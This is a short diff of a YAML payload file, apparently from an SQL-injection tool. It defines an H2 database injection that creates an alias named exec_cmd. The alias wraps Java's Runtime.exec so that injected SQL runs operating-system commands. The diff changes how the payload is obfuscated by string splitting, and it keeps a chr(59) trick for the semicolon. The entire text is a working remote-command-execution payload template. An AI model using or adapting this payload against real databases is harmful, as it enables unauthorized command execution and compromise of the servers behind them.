@@ -115,7 +115,7 @@ resource:
     # prevent semi-colon incompatible with stack
     createAlias: |
       ; CREATE ALIAS exec_cmd AS 'String runCmd(String c) throws Exception {
-         return new String(Runtime.get'||'Runtime().ex'||'ec(c).getInputStream().readAllBytes())'||chr(59)||'
+         return new String(Runtime.getRuntime().exec(c).getInputStream().readAllBytes())'||chr(59)||'
       }'
     runCmd: select exec_cmd('%s')||'${trail_sql}'
   
